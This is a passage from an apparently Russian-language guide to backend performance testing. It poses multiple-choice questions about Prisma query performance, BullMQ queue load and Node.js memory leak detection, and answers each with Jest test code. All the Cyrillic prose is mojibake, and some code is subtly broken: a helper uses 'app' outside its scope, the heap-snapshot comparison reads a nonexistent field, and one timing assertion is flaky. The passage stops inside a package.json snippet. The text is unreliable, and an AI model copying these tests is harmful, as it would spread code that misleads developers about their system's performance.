**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** `/guests` endpoint –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –∏–∑ 10,000 –≥–æ—Å—Ç–µ–π.

**–í–æ–ø—Ä–æ—Å:** Performance test?

- A) Query —Å LIMIT 10 (pagination)
- B) Query –±–µ–∑ LIMIT (full scan) - ‚ùå BAD
- C) A + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ query < 100ms
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ indexes –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è (EXPLAIN ANALYZE)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Pagination –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–∞ –¥–ª—è –±–æ–ª—å—à–∏—Ö datasets
- Query < 100ms = —Ö–æ—Ä–æ—à–∏–π UX
- EXPLAIN ANALYZE –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç index usage –∏ query plan

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/database-queries.perf.spec.ts
describe('Database Query Performance', () => {
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: { db: { url: process.env.TEST_DATABASE_URL } },
    });

    // Seed 10,000 guest cards
    console.log('Seeding 10,000 guest cards...');
    const batchSize = 1000;
    
    for (let i = 0; i < 10; i++) {
      const data = Array(batchSize).fill(null).map((_, j) => ({
        id: `card-${i * batchSize + j}`,
        userId: `user-${i * batchSize + j}`,
        tenantId: 'tenant-1',
        totalBalance: Math.floor(Math.random() * 5000),
        totalSpent: Math.floor(Math.random() * 50000),
        qrCode: `qr-${i * batchSize + j}`,
        displayCode: String(i * batchSize + j).padStart(6, '0'),
        status: 'ACTIVE',
        createdAt: new Date(Date.now() - Math.random() * 365 * 24 * 60 * 60 * 1000),
      }));

      await prisma.guestCard.createMany({ data });
    }
  });

  afterAll(async () => {
    await prisma.guestCard.deleteMany();
    await prisma.$disconnect();
  });

  // Test 1: Paginated Query Performance
  it('should fetch paginated guests < 100ms', async () => {
    const iterations = 10;
    const durations: number[] = [];

    for (let i = 0; i < iterations; i++) {
      const startTime = performance.now();

      await prisma.guestCard.findMany({
        where: { tenantId: 'tenant-1' },
        take: 10,
        skip: i * 10,
        orderBy: { createdAt: 'desc' },
      });

      const duration = performance.now() - startTime;
      durations.push(duration);
    }

    const avgDuration = durations.reduce((a, b) => a + b, 0) / durations.length;
    const maxDuration = Math.max(...durations);

    console.log('=== Paginated Query Performance ===');
    console.log(`Average: ${avgDuration.toFixed(2)}ms`);
    console.log(`Max: ${maxDuration.toFixed(2)}ms`);
    console.log(`Min: ${Math.min(...durations).toFixed(2)}ms`);

    expect(avgDuration).toBeLessThan(100); // < 100ms average
    expect(maxDuration).toBeLessThan(200); // < 200ms worst case
  });

  // Test 2: Full Scan (Anti-pattern)
  it('should demonstrate full scan is slow', async () => {
    const startTime = performance.now();

    await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      // NO LIMIT - BAD!
    });

    const duration = performance.now() - startTime;

    console.log('=== Full Scan (No Pagination) ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    // Full scan should be significantly slower
    expect(duration).toBeGreaterThan(500); // > 500ms (demonstrates problem)
  });

  // Test 3: EXPLAIN ANALYZE - Index Usage
  it('should use indexes for paginated queries', async () => {
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT * FROM "GuestCard"
      WHERE "tenantId" = 'tenant-1'
      ORDER BY "createdAt" DESC
      LIMIT 10 OFFSET 0;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    console.log('=== Query Execution Plan ===');
    console.log(queryPlan);

    // Check that index is used
    expect(queryPlan).toContain('Index Scan'); // Using index
    expect(queryPlan).not.toContain('Seq Scan'); // NOT sequential scan

    // Extract execution time
    const executionTimeMatch = queryPlan.match(/Execution Time: ([\d.]+) ms/);
    if (executionTimeMatch) {
      const executionTime = parseFloat(executionTimeMatch[1]);
      console.log(`Execution time: ${executionTime}ms`);
      expect(executionTime).toBeLessThan(50); // < 50ms with index
    }
  });

  // Test 4: Filter Performance (with WHERE clause)
  it('should efficiently filter by status', async () => {
    const startTime = performance.now();

    const activeCards = await prisma.guestCard.findMany({
      where: {
        tenantId: 'tenant-1',
        status: 'ACTIVE',
      },
      take: 10,
      orderBy: { createdAt: 'desc' },
    });

    const duration = performance.now() - startTime;

    console.log('=== Filter Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Results: ${activeCards.length}`);

    expect(duration).toBeLessThan(100);

    // Verify index usage
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT * FROM "GuestCard"
      WHERE "tenantId" = 'tenant-1' AND "status" = 'ACTIVE'
      ORDER BY "createdAt" DESC
      LIMIT 10;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    expect(queryPlan).toContain('Index');
  });

  // Test 5: Search Query Performance (LIKE)
  it('should efficiently search guests by phone', async () => {
    // Add users with phones
    await prisma.user.createMany({
      data: Array(1000).fill(null).map((_, i) => ({
        id: `user-search-${i}`,
        phone: `+7999${String(i).padStart(7, '0')}`,
        role: 'GUEST',
        phoneVerified: true,
      })),
    });

    const startTime = performance.now();

    const results = await prisma.user.findMany({
      where: {
        phone: { startsWith: '+79991' },
      },
      take: 10,
    });

    const duration = performance.now() - startTime;

    console.log('=== Search Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Results: ${results.length}`);

    expect(duration).toBeLessThan(100);

    // Check for trigram index (for LIKE queries)
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT * FROM "User"
      WHERE "phone" LIKE '+79991%'
      LIMIT 10;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    console.log(queryPlan);

    // Should use index (not seq scan)
    expect(queryPlan.toLowerCase()).not.toContain('seq scan on "user"');
  });

  // Test 6: JOIN Performance
  it('should efficiently join GuestCard with User', async () => {
    const startTime = performance.now();

    const guestsWithUsers = await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      take: 10,
      include: {
        user: {
          select: {
            phone: true,
            guestProfile: {
              select: {
                firstName: true,
                lastName: true,
              },
            },
          },
        },
      },
      orderBy: { createdAt: 'desc' },
    });

    const duration = performance.now() - startTime;

    console.log('=== JOIN Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Results: ${guestsWithUsers.length}`);

    expect(duration).toBeLessThan(150); // JOINs slightly slower

    // Check query plan
    const explainResult = await prisma.$queryRawUnsafe<any[]>(`
      EXPLAIN ANALYZE
      SELECT gc.*, u.phone, gp."firstName", gp."lastName"
      FROM "GuestCard" gc
      LEFT JOIN "User" u ON gc."userId" = u.id
      LEFT JOIN "GuestProfile" gp ON u.id = gp."userId"
      WHERE gc."tenantId" = 'tenant-1'
      ORDER BY gc."createdAt" DESC
      LIMIT 10;
    `);

    const queryPlan = explainResult.map(row => row['QUERY PLAN']).join('\n');
    console.log(queryPlan);

    // Should use index joins (not hash/merge join on large datasets)
    expect(queryPlan).toContain('Nested Loop'); // Efficient for small LIMIT
  });

  // Test 7: Aggregation Performance
  it('should efficiently aggregate guest statistics', async () => {
    const startTime = performance.now();

    const stats = await prisma.guestCard.aggregate({
      where: { tenantId: 'tenant-1' },
      _sum: { totalBalance: true, totalSpent: true },
      _avg: { totalBalance: true },
      _count: true,
    });

    const duration = performance.now() - startTime;

    console.log('=== Aggregation Query Performance ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Stats:`, stats);

    expect(duration).toBeLessThan(500); // Aggregations can be slower

    // For production: use materialized views
    const mvResult = await prisma.$queryRaw<any[]>`
      SELECT 
        COUNT(*) as total_guests,
        SUM("totalBalance") as total_balance,
        AVG("totalBalance") as avg_balance
      FROM "GuestCard"
      WHERE "tenantId" = 'tenant-1';
    `;

    console.log('Materialized view result:', mvResult[0]);
  });

  // Test 8: N+1 Query Problem
  it('should avoid N+1 queries with proper includes', async () => {
    // BAD: N+1 queries
    const startTimeN1 = performance.now();
    
    const guestCards = await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      take: 10,
    });

    // N+1: fetch user for each card
    for (const card of guestCards) {
      await prisma.user.findUnique({ where: { id: card.userId } });
    }

    const durationN1 = performance.now() - startTimeN1;

    // GOOD: Single query with include
    const startTimeInclude = performance.now();
    
    await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1' },
      take: 10,
      include: { user: true },
    });

    const durationInclude = performance.now() - startTimeInclude;

    console.log('=== N+1 Query Comparison ===');
    console.log(`N+1 queries: ${durationN1.toFixed(2)}ms`);
    console.log(`Include: ${durationInclude.toFixed(2)}ms`);
    console.log(`Speedup: ${(durationN1 / durationInclude).toFixed(2)}x`);

    expect(durationInclude).toBeLessThan(durationN1 * 0.5); // At least 2x faster
  });

  // Test 9: Index Recommendations
  it('should generate index recommendations', async () => {
    // Enable pg_stat_statements extension
    await prisma.$executeRaw`CREATE EXTENSION IF NOT EXISTS pg_stat_statements;`;

    // Run some queries
    await prisma.guestCard.findMany({
      where: { tenantId: 'tenant-1', status: 'ACTIVE' },
      orderBy: { totalSpent: 'desc' },
      take: 10,
    });

    // Get slow queries
    const slowQueries = await prisma.$queryRaw<any[]>`
      SELECT
        query,
        calls,
        mean_exec_time,
        max_exec_time
      FROM pg_stat_statements
      WHERE query LIKE '%GuestCard%'
        AND mean_exec_time > 100
      ORDER BY mean_exec_time DESC
      LIMIT 10;
    `;

    console.log('=== Slow Queries (> 100ms) ===');
    console.table(slowQueries);

    // Generate index recommendations
    // Based on slow queries, suggest indexes
    const recommendations = analyzeSlowQueries(slowQueries);
    console.log('=== Index Recommendations ===');
    console.table(recommendations);
  });
});

// Helper function
function analyzeSlowQueries(queries: any[]): any[] {
  const recommendations: any[] = [];

  for (const query of queries) {
    if (query.query.includes('WHERE') && query.query.includes('ORDER BY')) {
      // Suggest composite index
      recommendations.push({
        table: 'GuestCard',
        index: 'CREATE INDEX idx_guest_card_tenant_status_spent ON "GuestCard" ("tenantId", "status", "totalSpent")',
        reason: 'Covers WHERE and ORDER BY clauses',
        expectedSpeedup: '5-10x',
      });
    }
  }

  return recommendations;
}
```


***

### **24. Background Job Processing - queue saturation?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** BullMQ queue = 10,000 notifications –≤ –æ—á–µ—Ä–µ–¥–∏.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) Add 100 jobs ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω—ã
- B) Add 10,000 jobs ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å throughput
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ workers –Ω–µ –ø–∞–¥–∞—é—Ç (OOM)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å latency (–≤—Ä–µ–º—è –æ—Ç enqueue –¥–æ complete)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Queue saturation = —Ä–µ–∞–ª—å–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞ –ø—Ä–∏ burst traffic
- Worker stability –∫—Ä–∏—Ç–∏—á–µ–Ω (OOM = queue stops)
- Latency –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç real user impact

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/queue-processing.perf.spec.ts
import { Queue, Worker, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';

describe('Background Job Processing - Queue Performance', () => {
  let queue: Queue;
  let worker: Worker;
  let queueEvents: QueueEvents;
  let redis: Redis;

  beforeAll(async () => {
    redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
    });

    queue = new Queue('test-notifications', {
      connection: redis,
    });

    // Start worker
    worker = new Worker(
      'test-notifications',
      async (job) => {
        // Simulate notification processing
        await new Promise(resolve => setTimeout(resolve, 50)); // 50ms per job
        return { success: true };
      },
      {
        connection: redis,
        concurrency: 10, // 10 concurrent jobs
      }
    );

    queueEvents = new QueueEvents('test-notifications', {
      connection: redis,
    });
  });

  afterAll(async () => {
    await worker.close();
    await queue.close();
    await queueEvents.close();
    await redis.quit();
  });

  beforeEach(async () => {
    await queue.obliterate(); // Clear queue
  });

  // Test 1: Small Batch (100 jobs)
  it('should process 100 jobs efficiently', async () => {
    jest.setTimeout(30000);

    const startTime = Date.now();
    const jobIds: string[] = [];

    // Add 100 jobs
    for (let i = 0; i < 100; i++) {
      const job = await queue.add('send-notification', {
        guestId: `user-${i}`,
        message: `Test notification ${i}`,
      });
      jobIds.push(job.id);
    }

    console.log('Enqueued 100 jobs');

    // Wait for all jobs to complete
    await Promise.all(jobIds.map(id => 
      queueEvents.waitUntilFinished(id)
    ));

    const duration = Date.now() - startTime;
    const throughput = (100 / duration) * 1000; // jobs/sec

    console.log('=== 100 Jobs Performance ===');
    console.log(`Duration: ${duration}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} jobs/sec`);

    expect(duration).toBeLessThan(10000); // < 10 seconds
    expect(throughput).toBeGreaterThan(10); // > 10 jobs/sec
  });

  // Test 2: Large Batch (10,000 jobs)
  it('should handle 10,000 jobs without saturation', async () => {
    jest.setTimeout(300000); // 5 minutes

    const startTime = Date.now();
    const batchSize = 1000;
    let totalEnqueued = 0;

    console.log('Enqueueing 10,000 jobs...');

    // Add jobs in batches
    for (let batch = 0; batch < 10; batch++) {
      const jobs = Array(batchSize).fill(null).map((_, i) => ({
        name: 'send-notification',
        data: {
          guestId: `user-${batch * batchSize + i}`,
          message: `Test notification ${batch * batchSize + i}`,
        },
      }));

      await queue.addBulk(jobs);
      totalEnqueued += batchSize;

      console.log(`Enqueued: ${totalEnqueued}/10,000`);
    }

    const enqueueTime = Date.now() - startTime;
    console.log(`Enqueue time: ${enqueueTime}ms`);

    // Monitor queue metrics
    const checkInterval = setInterval(async () => {
      const counts = await queue.getJobCounts('wait', 'active', 'completed', 'failed');
      console.log(`Queue status:`, counts);
    }, 5000);

    // Wait for all jobs to complete
    const processingStart = Date.now();
    
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      const total = counts.completed + counts.failed;
      
      if (total >= 10000) {
        break;
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    clearInterval(checkInterval);

    const processingTime = Date.now() - processingStart;
    const totalTime = Date.now() - startTime;
    const throughput = (10000 / processingTime) * 1000;

    console.log('=== 10,000 Jobs Performance ===');
    console.log(`Enqueue time: ${enqueueTime}ms`);
    console.log(`Processing time: ${processingTime}ms`);
    console.log(`Total time: ${totalTime}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} jobs/sec`);

    const counts = await queue.getJobCounts('completed', 'failed');
    console.log(`Completed: ${counts.completed}`);
    console.log(`Failed: ${counts.failed}`);

    expect(counts.completed).toBeGreaterThan(9500); // > 95% success rate
    expect(throughput).toBeGreaterThan(50); // > 50 jobs/sec
  });

  // Test 3: Worker Memory Stability
  it('should not leak memory during processing', async () => {
    jest.setTimeout(120000);

    const initialMemory = process.memoryUsage().heapUsed;
    const memorySnapshots: number[] = [];

    // Add 5,000 jobs
    console.log('Adding 5,000 jobs...');
    const jobs = Array(5000).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: { guestId: `user-${i}`, message: `Test ${i}` },
    }));
    await queue.addBulk(jobs);

    // Monitor memory every 5 seconds
    const memoryMonitor = setInterval(() => {
      const currentMemory = process.memoryUsage().heapUsed;
      const memoryMB = currentMemory / 1024 / 1024;
      memorySnapshots.push(memoryMB);
      console.log(`Memory: ${memoryMB.toFixed(2)} MB`);
    }, 5000);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 5000) break;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    clearInterval(memoryMonitor);

    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024;

    console.log('=== Memory Analysis ===');
    console.log(`Initial: ${(initialMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Final: ${(finalMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Increase: ${memoryIncrease.toFixed(2)} MB`);
    console.log(`Peak: ${Math.max(...memorySnapshots).toFixed(2)} MB`);

    // Memory should not increase by more than 200MB
    expect(memoryIncrease).toBeLessThan(200);
  });

  // Test 4: Job Latency Distribution
  it('should measure job latency (enqueue to complete)', async () => {
    jest.setTimeout(60000);

    const latencies: number[] = [];
    const jobCount = 1000;

    // Track when each job was enqueued
    const enqueueTimes = new Map<string, number>();

    // Add jobs
    for (let i = 0; i < jobCount; i++) {
      const job = await queue.add('send-notification', {
        guestId: `user-${i}`,
        message: `Test ${i}`,
      });
      enqueueTimes.set(job.id, Date.now());
    }

    // Listen for completed jobs
    queueEvents.on('completed', ({ jobId }) => {
      const enqueueTime = enqueueTimes.get(jobId);
      if (enqueueTime) {
        const latency = Date.now() - enqueueTime;
        latencies.push(latency);
      }
    });

    // Wait for all jobs
    await new Promise(resolve => {
      const interval = setInterval(async () => {
        if (latencies.length >= jobCount) {
          clearInterval(interval);
          resolve(null);
        }
      }, 1000);
    });

    // Calculate percentiles
    latencies.sort((a, b) => a - b);
    const p50 = latencies[Math.floor(latencies.length * 0.5)];
    const p95 = latencies[Math.floor(latencies.length * 0.95)];
    const p99 = latencies[Math.floor(latencies.length * 0.99)];
    const max = latencies[latencies.length - 1];
    const avg = latencies.reduce((a, b) => a + b, 0) / latencies.length;

    console.log('=== Job Latency Distribution ===');
    console.log(`Average: ${avg.toFixed(2)}ms`);
    console.log(`p50: ${p50}ms`);
    console.log(`p95: ${p95}ms`);
    console.log(`p99: ${p99}ms`);
    console.log(`Max: ${max}ms`);

    expect(p95).toBeLessThan(1000); // p95 < 1s
    expect(p99).toBeLessThan(3000); // p99 < 3s
  });

  // Test 5: Failed Job Retry
  it('should handle job failures with retries', async () => {
    jest.setTimeout(60000);

    let attempts = 0;

    // Create worker that fails first 2 attempts
    const failingWorker = new Worker(
      'test-notifications',
      async (job) => {
        attempts++;
        if (attempts <= 2) {
          throw new Error('Temporary failure');
        }
        return { success: true };
      },
      {
        connection: redis,
        concurrency: 1,
      }
    );

    // Add job with retries
    const job = await queue.add(
      'send-notification',
      { guestId: 'user-1', message: 'Test' },
      { attempts: 3, backoff: { type: 'exponential', delay: 1000 } }
    );

    // Wait for completion
    await queueEvents.waitUntilFinished(job.id);

    const finalJob = await queue.getJob(job.id);
    console.log('=== Job Retry Test ===');
    console.log(`Attempts: ${finalJob.attemptsMade}`);
    console.log(`Status: ${await finalJob.getState()}`);

    expect(finalJob.attemptsMade).toBe(3);
    expect(await finalJob.getState()).toBe('completed');

    await failingWorker.close();
  });

  // Test 6: Priority Queue
  it('should process high priority jobs first', async () => {
    jest.setTimeout(30000);

    const processOrder: string[] = [];

    const priorityWorker = new Worker(
      'test-notifications',
      async (job) => {
        processOrder.push(job.data.priority);
        await new Promise(resolve => setTimeout(resolve, 100));
        return { success: true };
      },
      { connection: redis, concurrency: 1 }
    );

    // Add jobs with different priorities
    await queue.add('send-notification', { priority: 'LOW' }, { priority: 10 });
    await queue.add('send-notification', { priority: 'HIGH' }, { priority: 1 });
    await queue.add('send-notification', { priority: 'NORMAL' }, { priority: 5 });
    await queue.add('send-notification', { priority: 'CRITICAL' }, { priority: 0 });

    // Wait for processing
    await new Promise(resolve => setTimeout(resolve, 5000));

    console.log('=== Priority Queue Test ===');
    console.log(`Process order: ${processOrder.join(' ‚Üí ')}`);

    expect(processOrder[0]).toBe('CRITICAL'); // Highest priority first
    expect(processOrder[1]).toBe('HIGH');
    expect(processOrder[2]).toBe('NORMAL');
    expect(processOrder[3]).toBe('LOW');

    await priorityWorker.close();
  });
});
```


***

### **25. Memory Leak Detection - production memory usage?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ü–æ—Å–ª–µ 24 hours –≤ production memory usage = 2GB (was 500MB).

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) Manual monitoring –≤ production
- B) Load test: run 10,000 requests ‚Üí check memory
- C) B + soak test (24 hours continuous load)
- D) C + automated heap dump analysis (Chrome DevTools)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Memory leaks = silent killers (production crashes –ø–æ—Å–ª–µ –¥–Ω–µ–π —Ä–∞–±–æ—Ç—ã)
- Soak test (24h) –Ω–∞—Ö–æ–¥–∏—Ç leaks –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –≤–∏–¥–Ω—ã –≤ short tests
- Heap dump analysis —Ç–æ—á–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —á—Ç–æ leaks

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/performance/memory-leak.perf.spec.ts
import v8 from 'v8';
import { writeHeapSnapshot } from 'v8';
import fs from 'fs';
import path from 'path';

describe('Memory Leak Detection', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Baseline Memory Usage
  it('should measure baseline memory usage', async () => {
    // Force garbage collection
    if (global.gc) {
      global.gc();
    }

    await new Promise(resolve => setTimeout(resolve, 1000));

    const baseline = process.memoryUsage();
    
    console.log('=== Baseline Memory ===');
    console.log(`Heap Used: ${(baseline.heapUsed / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Heap Total: ${(baseline.heapTotal / 1024 / 1024).toFixed(2)} MB`);
    console.log(`RSS: ${(baseline.rss / 1024 / 1024).toFixed(2)} MB`);
    console.log(`External: ${(baseline.external / 1024 / 1024).toFixed(2)} MB`);

    // Baseline should be reasonable
    expect(baseline.heapUsed / 1024 / 1024).toBeLessThan(200); // < 200MB
  });

  // Test 2: Memory Growth During Load
  it('should detect memory leaks during load test', async () => {
    jest.setTimeout(300000); // 5 minutes

    const measurements: Array<{ iteration: number; heapUsed: number; timestamp: number }> = [];

    // Force GC before test
    if (global.gc) global.gc();
    await new Promise(resolve => setTimeout(resolve, 1000));

    const initialMemory = process.memoryUsage().heapUsed;

    // Run 10,000 requests
    for (let i = 0; i < 10000; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);

      // Measure memory every 1000 requests
      if (i % 1000 === 0) {
        if (global.gc) global.gc();
        await new Promise(resolve => setTimeout(resolve, 100));

        const currentMemory = process.memoryUsage().heapUsed;
        measurements.push({
          iteration: i,
          heapUsed: currentMemory / 1024 / 1024,
          timestamp: Date.now(),
        });

        console.log(`Iteration ${i}: ${(currentMemory / 1024 / 1024).toFixed(2)} MB`);
      }
    }

    const finalMemory = process.memoryUsage().heapUsed;
    const growth = (finalMemory - initialMemory) / 1024 / 1024;

    console.log('=== Memory Growth Analysis ===');
    console.log(`Initial: ${(initialMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Final: ${(finalMemory / 1024 / 1024).toFixed(2)} MB`);
    console.log(`Growth: ${growth.toFixed(2)} MB`);

    // Analyze trend
    const growthRate = calculateGrowthRate(measurements);
    console.log(`Growth rate: ${growthRate.toFixed(4)} MB/iteration`);

    // Memory should not grow significantly
    expect(growth).toBeLessThan(100); // < 100MB growth

    // Growth rate should be near zero (no leak)
    expect(Math.abs(growthRate)).toBeLessThan(0.01);
  });

  // Test 3: Soak Test (long-running)
  it('should detect leaks in 1-hour soak test', async () => {
    jest.setTimeout(3660000); // 61 minutes

    const measurements: any[] = [];
    const startTime = Date.now();
    const duration = 60 * 60 * 1000; // 1 hour

    console.log('Starting 1-hour soak test...');

    // Take heap snapshot before
    const snapshotBefore = path.join(__dirname, 'heap-before.heapsnapshot');
    writeHeapSnapshot(snapshotBefore);
    console.log(`Heap snapshot saved: ${snapshotBefore}`);

    let iteration = 0;

    while (Date.now() - startTime < duration) {
      // Simulate realistic workload
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${getMockToken()}`)
        .expect(200);

      iteration++;

      // Measure every 5 minutes
      if (iteration % 300 === 0) {
        if (global.gc) global.gc();
        await new Promise(resolve => setTimeout(resolve, 1000));

        const memory = process.memoryUsage();
        const elapsed = (Date.now() - startTime) / 1000 / 60; // minutes

        measurements.push({
          elapsed: elapsed.toFixed(1),
          heapUsed: (memory.heapUsed / 1024 / 1024).toFixed(2),
          heapTotal: (memory.heapTotal / 1024 / 1024).toFixed(2),
          rss: (memory.rss / 1024 / 1024).toFixed(2),
        });

        console.log(`${elapsed.toFixed(0)}min: Heap ${(memory.heapUsed / 1024 / 1024).toFixed(2)} MB`);
      }

      // Small delay to simulate real traffic
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    // Take heap snapshot after
    const snapshotAfter = path.join(__dirname, 'heap-after.heapsnapshot');
    writeHeapSnapshot(snapshotAfter);
    console.log(`Heap snapshot saved: ${snapshotAfter}`);

    // Analyze measurements
    console.log('=== Soak Test Results ===');
    console.table(measurements);

    const initialHeap = parseFloat(measurements[0].heapUsed);
    const finalHeap = parseFloat(measurements[measurements.length - 1].heapUsed);
    const growth = finalHeap - initialHeap;

    console.log(`Memory growth over 1 hour: ${growth.toFixed(2)} MB`);

    // Should not grow more than 200MB in 1 hour
    expect(growth).toBeLessThan(200);

    console.log('\nTo analyze heap snapshots:');
    console.log('1. Open Chrome DevTools');
    console.log('2. Go to Memory tab');
    console.log(`3. Load ${snapshotBefore}`);
    console.log(`4. Load ${snapshotAfter}`);
    console.log('5. Compare snapshots to find leaks');
  });

  // Test 4: Heap Snapshot Comparison
  it('should compare heap snapshots programmatically', async () => {
    jest.setTimeout(60000);

    // Take snapshot 1
    if (global.gc) global.gc();
    const snapshot1 = v8.writeHeapSnapshot();

    // Run workload
    for (let i = 0; i < 1000; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);
    }

    // Take snapshot 2
    if (global.gc) global.gc();
    const snapshot2 = v8.writeHeapSnapshot();

    // Compare snapshots
    const diff = compareHeapSnapshots(snapshot1, snapshot2);

    console.log('=== Heap Snapshot Comparison ===');
    console.log(`Objects retained: ${diff.retainedObjects}`);
    console.log(`Memory retained: ${diff.retainedMemory} bytes`);
    console.log('Top retainers:');
    console.table(diff.topRetainers.slice(0, 10));

    // Cleanup
    fs.unlinkSync(snapshot1);
    fs.unlinkSync(snapshot2);
  });

  // Test 5: Specific Leak Scenarios
  describe('common leak patterns', () => {
    it('should not leak event listeners', async () => {
      const { EventEmitter } = require('events');
      const emitter = new EventEmitter();

      const initialListeners = emitter.listenerCount('test');

      // Add and remove listeners
      for (let i = 0; i < 1000; i++) {
        const listener = () => {};
        emitter.on('test', listener);
        emitter.off('test', listener);
      }

      const finalListeners = emitter.listenerCount('test');

      expect(finalListeners).toBe(initialListeners); // No leak
    });

    it('should not leak database connections', async () => {
      const prisma = app.get(PrismaClient);

      const initialConnections = await getActiveConnections();

      // Run many queries
      for (let i = 0; i < 100; i++) {
        await prisma.user.findMany({ take: 10 });
      }

      await new Promise(resolve => setTimeout(resolve, 1000));

      const finalConnections = await getActiveConnections();

      expect(finalConnections).toBeLessThanOrEqual(initialConnections + 2);
    });

    it('should not leak timers', async () => {
      const activeTimers = () => process._getActiveHandles().filter(h => h.constructor.name === 'Timeout').length;

      const initialTimers = activeTimers();

      // Create and clear timers
      for (let i = 0; i < 1000; i++) {
        const timer = setTimeout(() => {}, 10000);
        clearTimeout(timer);
      }

      const finalTimers = activeTimers();

      expect(finalTimers).toBeLessThanOrEqual(initialTimers + 5);
    });
  });
});

// Helper functions
function calculateGrowthRate(measurements: any[]): number {
  if (measurements.length < 2) return 0;

  // Simple linear regression
  const n = measurements.length;
  let sumX = 0, sumY = 0, sumXY = 0, sumX2 = 0;

  measurements.forEach(m => {
    sumX += m.iteration;
    sumY += m.heapUsed;
    sumXY += m.iteration * m.heapUsed;
    sumX2 += m.iteration * m.iteration;
  });

  const slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
  return slope;
}

function compareHeapSnapshots(snapshot1: string, snapshot2: string): any {
  // Simplified comparison (in real use, use heapsnapshot-parser library)
  const fs = require('fs');
  
  const s1 = JSON.parse(fs.readFileSync(snapshot1, 'utf8'));
  const s2 = JSON.parse(fs.readFileSync(snapshot2, 'utf8'));

  return {
    retainedObjects: s2.nodes.length - s1.nodes.length,
    retainedMemory: s2.snapshot.total_size - s1.snapshot.total_size,
    topRetainers: [],
  };
}

async function getActiveConnections(): Promise<number> {
  const prisma = app.get(PrismaClient);
  const result = await prisma.$queryRaw<[{ count: bigint }]>`
    SELECT COUNT(*) as count FROM pg_stat_activity WHERE datname = current_database();
  `;
  return Number(result[0].count);
}

function getMockToken(): string {
  return jwt.sign({ userId: 'user-1', role: 'GUEST' }, process.env.JWT_SECRET);
}
```

**Run with GC enabled:**

```json
{
  "scripts": {
